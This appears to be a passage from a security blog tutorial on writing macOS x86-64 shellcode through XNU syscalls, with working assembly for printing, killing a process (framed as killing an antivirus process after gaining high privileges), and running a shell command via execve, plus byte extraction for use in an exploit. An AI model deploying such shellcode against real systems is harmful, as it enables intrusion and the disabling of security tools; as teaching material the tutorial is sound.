+<p>So from the description we can know that we need to supply the string pointer to <code>buf</code> the second argument and number of bytes (<code>length</code>) to the third argument <code>nbyte</code>, And for fields&#x2F;fd or File Descriptor, When we search it we will see that it takes the following values</p>
+<ul>
+<li><code>0 (STDIN_FILENO)</code>: Represents standard input, typically connected to the keyboard or the input of a pipe.</li>
+<li><code>1 (STDOUT_FILENO)</code>: Represents standard output, typically connected to the display or the output of a pipe.</li>
+<li><code>2 (STDERR_FILENO)</code>: Represents standard error, typically connected to the display for error messages.</li>
+</ul>
+<p>Our goal here is <code>STDOUT</code> which is value <code>1</code>. So our syscall will be as the following:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    write(<span class="number">1</span>, message, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>Let’s start with writing our shellcode:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">global _main</span><br><span class="line"></span><br><span class="line">_main:</span><br><span class="line">	mov rdi, 1 ; stdout for fd argument</span><br><span class="line">	mov rcx, &#x27;Hello&#x27; ; put our string value into RCX</span><br><span class="line">	push rcx ; We push our string to the stack</span><br><span class="line">	mov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument</span><br><span class="line">	mov rdx, 5 ; nbytes argument (our string length)</span><br><span class="line">	mov rax, 0x2000004 ; The BSD syscall class entry + syscall number</span><br><span class="line">	syscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure></figure>
+
+<p>Here our shellcode, starting with <code>bits 64</code> to enforce x86-64 mode and <code>global _main</code> to export the Mach-O entry point. The first instruction <code>mov rdi, 1</code> loads the file descriptor <code>1</code> (stdout) into <code>RDI</code>, the first argument register as we mentioned before. Next, <code>mov rcx, &#39;Hello&#39;</code> encodes the 5-character string as a 64-bit immediate <code>0x6f6c6c6548</code> (little-endian: <code>&#39;o&#39;,&#39;l&#39;,&#39;l&#39;,&#39;e&#39;,&#39;H&#39;</code>) into <code>RCX</code>. The <code>push rcx</code> then writes these 8 bytes to the stack, placing <code>&#39;H&#39;</code> at the new stack pointer and padding the remaining 3 bytes with zeros <code>0x00</code> to align the stack, Then <code>mov rsi, rsp</code> copies the current stack pointer into <code>RSI</code>, Which is the second argument, so it now points directly to the first character <code>&#39;H&#39;</code>, forming a valid <code>char *buf</code>. The <code>mov rdx, 5</code> sets the third argument, which is the number of bytes to write and exactly matching the length of <code>Hello</code>. Finally, <code>mov rax, 0x2000004</code> loads the <code>XNU</code> encoded syscall number: <code>(SYSCALL_CLASS_UNIX &lt;&lt; 24) | 4</code>, where class <code>2</code> routes to the BSD subsystem and <code>4</code> selects the <code>write</code> entry from <code>bsd/kern/syscalls.master</code>. The <code>syscall</code> instruction triggers the kernel trap, dispatching through <code>XNU</code>’s unified handler to execute <code>write(1, &quot;Hello&quot;, 5)</code>, printing <code>Hello</code> to the terminal.</p>
+<p>Let’s save our code into file <code>hello.asm</code> and compile our code.</p>
+<ul>
+<li>First we will turn the code to object file for <code>macho64</code> architecture using <code>nasm</code>:</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding % nasm -f macho64 hello.asm</span><br><span class="line">shellcoding % <span class="built_in">ls</span></span><br><span class="line">hello.asm	hello.o</span><br></pre></td></tr></table></figure></figure>
+
+<p>As we see we got our object file <code>hello.o</code>.</p>
+<ul>
+<li>Second, We will link the required libraries needed for the code to generate the executable using <code>ld</code></li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macos 15.5 15.5</span><br><span class="line">ld: warning: no platform load <span class="built_in">command</span> found <span class="keyword">in</span> <span class="string">&#x27;hello.o&#x27;</span>, assuming: macOS</span><br><span class="line">shellcoding % <span class="built_in">ls</span></span><br><span class="line">hello		hello.asm	hello.o</span><br></pre></td></tr></table></figure></figure>
+
+<p>Here we can see after linking we got our executable.</p>
+<blockquote>
+<p>Note: The <code>-L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib</code> sets the <strong>library search path</strong> to the macOS 15.5 SDK’s <code>usr/lib</code> directory, ensuring the linker locates the correct version of <code>libSystem.tbd</code> — Apple’s modern stub library format that resolves to <code>libSystem.dylib</code> at runtime. The <code>-lSystem</code> flag explicitly links against <strong>libSystem</strong>, the foundational system library that exports the <code>syscall</code> interface, <code>write</code>, <code>exit</code>, and all BSD&#x2F;POSIX functions; without it, the <code>syscall</code> instruction in our shellcode would remain unresolved, causing a linker error. Finally, <code>-platform_version macos 15.5 15.5</code> declares the <strong>minimum deployment target</strong> as macOS 15.5 (Sequoia), embedding the <code>LC_VERSION_MIN_MACOSX</code> load command and forcing the use of Sequoia-compatible API stubs and system call encodings — essential for forward and backward compatibility on modern Apple silicon and Intel systems.</p>
+</blockquote>
+<ul>
+<li>Let’s run and test our executable:</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding % ./hello </span><br><span class="line">Hellozsh: segmentation fault  ./hello</span><br></pre></td></tr></table></figure></figure>
+
+<p>We see that our execution results in <code>segmentation fault</code>, And the reason for that the program doesn’t <code>return</code> or in simple words exit. For example, Within the main function in <code>C</code>, When return is used in the main function (e.g., <code>return 0;</code>), it typically translates to an <code>exit_group</code> system call (<code>exit</code>). This system call terminates the entire process and returns the specified exit status to the operating system. So, We need to exit after executing our <code>write</code> syscall.</p>
+<h2 id="Exit"><a href="#Exit" class="headerlink" title="Exit"></a>Exit</h2><p>We can exit using <code>exit</code> syscall, as we can see it in the <code>syscalls.master</code> file:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>	AUE_EXIT	ALL	&#123; <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> rval)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>The syscall number is <code>1</code> and it takes only 1 integer argument <code>rval</code> which is the value to return. When we go to documentation the <code>rval</code> value can be <code>0</code> for <code>EXIT_SUCCESS</code> (successful execution of a program) or <code>EXIT_FAILURE</code> (unsuccessful execution of a program). Let’s update our shellcode and add <code>exit</code> syscall</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">global _main</span><br><span class="line"></span><br><span class="line">_main:</span><br><span class="line">	mov rdi, 1 ; stdout for fd argument</span><br><span class="line">	mov rcx, &#x27;Hello&#x27; ; put our string value into RCX</span><br><span class="line">	push rcx ; We push our string to the stack</span><br><span class="line">	mov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument</span><br><span class="line">	mov rdx, 5 ; nbytes argument (our string length)</span><br><span class="line">	mov rax, 0x2000004 ; The BSD syscall class entry + write syscall number</span><br><span class="line">	syscall ; invoke/execute syscall</span><br><span class="line">	</span><br><span class="line">	mov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class="line">	mov rdi, 0 ; arg int rval</span><br><span class="line">	syscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure></figure>
+
+<p>Now, let’s repeat the process of compiling to get our executable again and test it.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding % nasm -f macho64 hello.asm</span><br><span class="line">shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class="line">ld: warning: no platform load <span class="built_in">command</span> found <span class="keyword">in</span> <span class="string">&#x27;/Users/zeyadazima.com/shellcoding/hello.o&#x27;</span>, assuming: macOS</span><br><span class="line">shellcoding % ./hello </span><br><span class="line">Hello%                                                           </span><br><span class="line">shellcoding % </span><br></pre></td></tr></table></figure></figure>
+
+<p>As we see clearly our code worked perfectly. </p>
+<h2 id="Kill-a-Process"><a href="#Kill-a-Process" class="headerlink" title="Kill a Process"></a>Kill a Process</h2><p>Let’s do another shellcode, And take a scenario in case we found a way to execute a code with high privileges and We need to write a shellcode to kill the <code>AV</code> process.</p>
+<p>The <code>C</code> code to kill a process is as the following:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> <span class="comment">// For pid_t</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>    <span class="comment">// For getpid() (optional, for self-killing example)</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> target_pid;</span><br><span class="line"></span><br><span class="line">    target_pid = <span class="number">12345</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sending SIGTERM (graceful termination)</span></span><br><span class="line">    kill(target_pid, SIGTERM);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>We can see here we used <code>kill</code> function and supply the <code>PID</code> and the signal which is <code>SIGTERM</code>.</p>
+<p>Now, If we search for <code>kill</code> in <code>syscalls.master</code>. We can find it:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="number">37</span>	AUE_KILL	ALL	&#123; <span class="type">int</span> <span class="title function_">kill</span><span class="params">(<span class="type">int</span> pid, <span class="type">int</span> signum, <span class="type">int</span> posix)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>For the <code>PID</code> we will create a test process and get it’s <code>PID</code> to supply it for the first argument and for the <code>signum</code> argument, In the <code>C</code> code the value is <code>SIGTERM</code> which it will be a pre-defined value in the source code, We can search for <code>#define SIGTERM</code> in the <code>XNU</code> source code, We will find it at <code>xnu-xnu-11417.121.6/bsd/sys/signal.h:103</code>:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIGKILL 9       <span class="comment">/* kill (cannot be caught or ignored) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGBUS  10      <span class="comment">/* bus error */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGSEGV 11      <span class="comment">/* segmentation violation */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGSYS  12      <span class="comment">/* bad argument to system call */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGPIPE 13      <span class="comment">/* write on a pipe with no one to read it */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGALRM 14      <span class="comment">/* alarm clock */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGTERM 15      <span class="comment">/* software termination signal from kill */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGURG  16      <span class="comment">/* urgent condition on IO channel */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGSTOP 17      <span class="comment">/* sendable stop signal not from tty */</span></span></span><br></pre></td></tr></table></figure></figure>
+
+<p>So we can see that <code>SIGTERM</code> value is <code>15</code>, But the better option to use <code>SIGKILL</code> with value <code>9</code> as it will be forced and kill (cannot be caught or ignored). We will supply <code>9</code> as the second argument. Now, In the <code>C</code> code it doesn’t have a 3rd argument as we see for the <code>syscall</code>. If we search for <code>int posix</code> in the <code>XNU</code> source code, We gonna find the following code under <code>xnu-xnu-11417.121.6/bsd/kern/kern_sig.c:1373</code>:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">kill</span><span class="params">(<span class="type">proc_t</span> cp, <span class="keyword">struct</span> kill_args *uap, __unused <span class="type">int32_t</span> *retval)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">proc_t</span> p;</span><br><span class="line">	<span class="type">kauth_cred_t</span> uc = kauth_cred_get();</span><br><span class="line">	<span class="type">int</span> posix = uap-&gt;posix;         <span class="comment">/* !0 if posix behaviour desired */</span></span><br><span class="line"></span><br><span class="line">	AUDIT_ARG(pid, uap-&gt;pid);</span><br><span class="line">	AUDIT_ARG(signum, uap-&gt;signum);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((u_int)uap-&gt;signum &gt;= NSIG) &#123;</span><br><span class="line">		<span class="keyword">return</span> EINVAL;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>We can see from apple comment on the source code that, if we want <code>POSIX</code> behaviour in killing the process we have to supply anything other than <code>0</code>. And after more searching and asking diff <code>AI</code> chatbots i got the following:</p>
+<figure class="my-table"><table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>posix = 0</code></td>
+<td>Mach (legacy) signal behavior</td>
+</tr>
+<tr>
+<td><code>posix = 1</code> (or any <code>!0</code>)</td>
+<td>POSIX&#x2F;BSD signal behavior</td>
+</tr>
+</tbody></table></figure>
+<blockquote>
+<p>Note: usually when you see extra arguments that was not mentioned or supplyed in the <code>C</code> code, It means that the argument is optional and not really required so you always can supply <code>0</code> or <code>NULL</code> as a value to the optional&#x2F;non-required arguments.<br>Let’s run our test process using a simple infinity loop running in background:</p>
+</blockquote>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding % <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> <span class="built_in">sleep</span> 10; <span class="keyword">done</span> &amp;</span><br><span class="line">[2] 27646</span><br><span class="line">shellcoding % ps -p 27646</span><br><span class="line">  PID TTY           TIME CMD</span><br><span class="line">27646 ttys061    0:00.01 -zsh</span><br></pre></td></tr></table></figure></figure>
+<p>the <code>PID</code> is <code>27646</code></p>
+<p>Now, Lets write our shellcode:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">global _main</span><br><span class="line"></span><br><span class="line">_main:</span><br><span class="line">	mov rdi, 27646 ; 1st argument PID</span><br><span class="line">	mov rsi, 9 ; 2nd argument signum</span><br><span class="line">	mov rdx, 0 ; 3rd argument posix</span><br><span class="line">	mov rax, 0x2000025 ; The BSD syscall class entry + 0x25 (which is 37 in hex) kill syscall</span><br><span class="line">	syscall</span><br><span class="line">	</span><br><span class="line">	mov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class="line">	mov rdi, 0 ; arg int rval</span><br><span class="line">	syscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure></figure>
+
+<p>It’s already clear here, We passed our arguments as the following; <code>PID</code> for <code>RDI</code>, then <code>signum</code> for <code>RSI</code> and After that, <code>posix</code> to <code>RDX</code> and setup our <code>syscall</code>. Finally, We exit gracefully using <code>exit</code> syscall.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding % nasm -f macho64 killer.asm                                                                                                       </span><br><span class="line">shellcoding % ld -o killer killer.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class="line">ld: warning: no platform load <span class="built_in">command</span> found <span class="keyword">in</span> <span class="string">&#x27;/Users/zeyadazima.com/shellcoding/killer.o&#x27;</span>, assuming: macOS</span><br><span class="line">shellcoding % ./killer </span><br><span class="line">shellcoding % </span><br><span class="line">[2]  - killed     <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span>; <span class="built_in">sleep</span> 10; <span class="keyword">done</span></span><br><span class="line">shellcoding % ps -p 27646</span><br><span class="line">  PID TTY           TIME CMD</span><br></pre></td></tr></table></figure></figure>
+
+<p>As we can see clearly, The process has been killed successfully.</p>
+<h2 id="Execute-Command"><a href="#Execute-Command" class="headerlink" title="Execute Command"></a>Execute Command</h2><p>Now, The exciting parts where we need to execute commands. Let’s bring our <code>C</code> code to execute commands on the system. Which is usually in <code>C</code> it’s done through <code>system()</code> function. But remember that on the <code>XNU</code> has <code>BSD</code>. So Let’s search for <code>C</code> code where execute commands using <code>BSD</code> functions.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> *<span class="type">const</span> argv[] = &#123;<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="literal">NULL</span>&#125;; <span class="comment">// Command and its arguments</span></span><br><span class="line">    <span class="type">char</span> *<span class="type">const</span> envp[] = &#123;<span class="literal">NULL</span>&#125;; <span class="comment">// Environment variables (can be customized)</span></span><br><span class="line"></span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, envp);</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>As we can see here it uses <code>execv()</code> function and it takes 3 arguments. lET’S SEARCH FOR it in the <code>syscalls.master</code>:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="number">59</span>	AUE_EXECVE	ALL	&#123; <span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">char</span> *fname, <span class="type">char</span> **argp, <span class="type">char</span> **envp)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>So it takes a pointer to the <code>fname</code> which is the file name, then pointer to array <code>argp</code> and pointer to another array <code>envp</code>.</p>
+<p><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/macos/write-syscall-chain.png" width="" height="" srcset="" alt="write syscall chain snippet" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture><figcaption>write syscall chain snippet</figcaption></figure></p>
+<p>We can see that in the description of <code>execve()</code>, the first argument is the path to the binary we want to execute which is gonna be the shell in this case <code>/bin/zsh</code>. Then for the second argument it takes array the arguments of the executable or program we passing and the first element in the array has to be the same file name <code>/bin/zsh</code>, So the array will be as the following, if we want to execute<code>echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt</code>  command <code>&#123;&quot;/bin/zsh&quot;,&quot;-c&quot;,&quot;echo &#39;W00tW00t&#39; &gt; /tmp/Pwned.txt&quot;&#125;</code>. The third argument as mentioned is optional so we can supply a pointer to <code>NULL</code> array.</p>
+<p>Let’s go on and write our shellcode:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">global _main</span><br><span class="line"></span><br><span class="line">_main:</span><br><span class="line"></span><br><span class="line">	mov rcx, 0 	; NULL Terminator</span><br><span class="line">	push rcx 	; push the NULL Terminator to the stack</span><br><span class="line">	mov rdx, &#x27;/bin/zsh&#x27; 	;  our file/executable name</span><br><span class="line">	push rdx 	; push the file/executable name to the stack</span><br><span class="line">	mov rdi, rsp 	; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class="line">	mov rbx, &#x27;-c&#x27; 	; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class="line">	push rbx 	; push argp[1] to the stack</span><br><span class="line">	mov rbx, rsp 	; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class="line">	push rcx 	; push the NULL Terminator to the stack</span><br></pre></td></tr></table></figure></figure>
+
+<p>Let’s stop here for a while, We need to place our 3rd element which is our command <code>echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt</code>, Which is for a string to long and to divide it to push it on the stack will not be the best thing our shellcode will be so long. Instead we gonna use a trick to place it on the stack for example:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">call array</span><br><span class="line">db &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0</span><br></pre></td></tr></table></figure></figure>
+
+<p><code>call</code> pushes the address of the following <code>db</code> string onto the stack. Which will make it easier for us.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">global _main</span><br><span class="line"></span><br><span class="line">_main:</span><br><span class="line"></span><br><span class="line">	xor rcx, rcx 	; NULL Terminator</span><br><span class="line">	push rcx 	; push the NULL Terminator to the stack</span><br><span class="line">	mov rdx, &#x27;/bin/zsh&#x27; 	;  our file/executable name</span><br><span class="line">	push rdx 	; push the file/executable name to the stack</span><br><span class="line">	mov rdi, rsp 	; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class="line">	mov rbx, &#x27;-c&#x27; 	; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class="line">	push rbx 	; push argp[1] to the stack</span><br><span class="line">	mov rbx, rsp 	; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class="line">	push rcx 	; push the NULL Terminator to the stack</span><br><span class="line"></span><br><span class="line">; classic position-independent trick</span><br><span class="line">	call array ; call the array label to setup the array for argp</span><br><span class="line">	db &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0 ; arg[2] which is our command and including the NULL Terminator</span><br></pre></td></tr></table></figure></figure>
+
+<p>Now, We need to make <code>array</code> label where it will setup the array elements and execute the <code>execve</code> syscall and then exit.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">global _main</span><br><span class="line"></span><br><span class="line">_main:</span><br><span class="line"></span><br><span class="line">	xor rcx, rcx 	; NULL Terminator</span><br><span class="line">	push rcx 	; push the NULL Terminator to the stack</span><br><span class="line">	mov rdx, &#x27;/bin/zsh&#x27; 	;  our file/executable name</span><br><span class="line">	push rdx 	; push the file/executable name to the stack</span><br><span class="line">	mov rdi, rsp 	; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class="line">	mov rbx, &#x27;-c&#x27; 	; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class="line">	push rbx 	; push argp[1] to the stack</span><br><span class="line">	mov rbx, rsp 	; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class="line">	push rcx 	; push the NULL Terminator to the stack</span><br><span class="line">	call array ; call the array label to setup the array for argp</span><br><span class="line">	db &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0 ; arg[2] which is our command and including the NULL Terminator</span><br><span class="line">	</span><br><span class="line">array:</span><br><span class="line">	push rbx ; arg[1] put the -c pointer into the array</span><br><span class="line">	push rdi ; args[0] which is fname saved before</span><br><span class="line">	mov rsi, rsp ; pass the array pointer for RSI which holds the second argument</span><br><span class="line">	xor rdx, rdx ; empty rdx to use as NULL for the third argument envp</span><br><span class="line">	mov rax, 0x200003B ; The BSD syscall class entry + 0x3B (which is 59 in hex) kill syscall</span><br><span class="line">	syscall ; invoke/execute syscall</span><br><span class="line">	</span><br><span class="line">	mov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class="line">	mov rdi, 0 ; arg int rval</span><br><span class="line">	syscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure></figure>
+
+<p>Here our shellcode, first zeroes <code>RCX</code> with <code>xor rcx, rcx</code> and <code>push rcx</code> to place an 8-byte <code>NULL</code> on the stack which will be reused as padding and as a <code>NULL</code> terminator. Next <code>mov rdx, &#39;/bin/zsh&#39;</code> loads the bytes for the <code>filename</code> into <code>RDX</code> and <code>push rdx</code> writes those 8 bytes to the stack so that <code>RSP</code> now points at the <code>&quot;/bin/zsh&quot;</code> string. <code>mov rdi, rsp</code> copies that stack pointer into <code>RDI</code>, which is the first argument to <code>execve</code> (the <code>filename</code> pointer).After that load <code>&#39;-c&#39;</code> into <code>RBX</code> and <code>push rbx</code>, creating the <code>&quot;-c&quot;</code> string on the stack; <code>mov rbx, rsp</code> saves the pointer to the <code>&quot;-c&quot;</code> string in <code>RBX</code> for later. Another <code>push rcx</code> places a <code>NULL</code> on the stack. The <code>call array</code> instruction is the classic position-independent trick, it pushes the address of the immediately following <code>db</code> bytes (the command string) onto the stack and then jumps to the <code>array</code> label, so the command string’s runtime address is already on the stack when <code>array</code> executes. The <code>db &#39;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#39;, 0</code> provides the NUL-terminated command that <code>zsh -c</code> will execute. Then, At <code>array</code>  label we will build the <code>argp</code> array by <code>push rbx</code> (push pointer to <code>&quot;-c&quot;</code>) and <code>push rdi</code> (push pointer to <code>&quot;/bin/zsh&quot;</code>), then <code>mov rsi, rsp</code> sets <code>RSI</code> to point at that array so <code>execve</code> receives <code>argp</code> correctly. Following <code>xor rdx, rdx</code> sets <code>RDX = 0</code> so <code>envp</code> is <code>NULL</code>. <code>mov rax, 0x200003B</code> loads the <code>BSD</code> syscall number for <code>execve</code>.</p>
+<blockquote>
+<p>Note: <code>0x3B</code> &#x3D; 59 decimal → <code>execve</code></p>
+</blockquote>
+<p>And <code>syscall</code> invokes the kernel to execute <code>execve(filename, argv, envp)</code>. If <code>execve</code> returns (i.e., it failed) the code falls through to <code>mov rax, 0x2000001</code> &#x2F; <code>mov rdi, 0</code> &#x2F; <code>syscall</code> which calls the <code>exit</code> syscall to terminate the process.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding % nasm -f macho64 execute.asm                                                                                                          </span><br><span class="line">shellcoding % ld -o execute execute.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class="line">ld: warning: no platform load <span class="built_in">command</span> found <span class="keyword">in</span> <span class="string">&#x27;/Users/zeyadazima.com/shellcoding/execute.o&#x27;</span>, assuming: macOS</span><br><span class="line">shellcoding % <span class="built_in">ls</span> /tmp</span><br><span class="line">node-compile-cache OSL_PIPE_501_SingleOfficeIPC	powerlog</span><br><span class="line">shellcoding % ./execute                                                                                                                            </span><br><span class="line">shellcoding % <span class="built_in">ls</span> /tmp  </span><br><span class="line">node-compile-cache OSL_PIPE_501_SingleOfficeIPC	powerlog Pwned.txt</span><br><span class="line">/tmp % <span class="built_in">cat</span> Pwned.txt </span><br><span class="line">W00tW00t</span><br></pre></td></tr></table></figure></figure>
+
+<p>We can see clearly, That our shellcode is executed successfully and our file created.</p>
+<h1 id="Extract-Shellcode"><a href="#Extract-Shellcode" class="headerlink" title="Extract Shellcode"></a>Extract Shellcode</h1><p>Now, Let’s extract our shellcode from the object file, So if we need to send it with our exploit. We will use <code>objdump</code> tool and will show also how to do it with <code>otool</code>.</p>
+<h2 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h2><figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding% objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o</span><br><span class="line"></span><br><span class="line">execute.o:	file format mach-o 64-bit x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section __TEXT,__text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;_main&gt;:</span><br><span class="line">       0: 48 31 c9                     	xor	rcx, rcx</span><br><span class="line">       3: 51                           	push	rcx</span><br><span class="line">       4: 48 ba 2f 62 69 6e 2f 7a 73 68	movabs	rdx, 0x68737a2f6e69622f</span><br><span class="line">       e: 52                           	push	rdx</span><br><span class="line">       f: 48 89 e7                     	mov	rdi, rsp</span><br><span class="line">      12: bb 2d 63 00 00               	mov	ebx, 0x632d</span><br><span class="line">      17: 53                           	push	rbx</span><br><span class="line">      18: 48 89 e3                     	mov	rbx, rsp</span><br><span class="line">      1b: 51                           	push	rcx</span><br><span class="line">      1c: e8 21 00 00 00               	call	0x42 &lt;array&gt;</span><br><span class="line">      21: 65 63 68 6f                  	movsxd	ebp, dword ptr gs:[rax + 0x6f]</span><br><span class="line">      25: 20 22                        	and	byte ptr [rdx], ah</span><br><span class="line">      27: 57                           	push	rdi</span><br><span class="line">      28: 30 30                        	xor	byte ptr [rax], dh</span><br><span class="line">      2a: 74 57                        	je	0x83 &lt;array+0x41&gt;</span><br><span class="line">      2c: 30 30                        	xor	byte ptr [rax], dh</span><br><span class="line">      2e: 74 22                        	je	0x52 &lt;array+0x10&gt;</span><br><span class="line">      30: 20 3e                        	and	byte ptr [rsi], bh</span><br><span class="line">      32: 20 2f                        	and	byte ptr [rdi], ch</span><br><span class="line">      34: 74 6d                        	je	0xa3 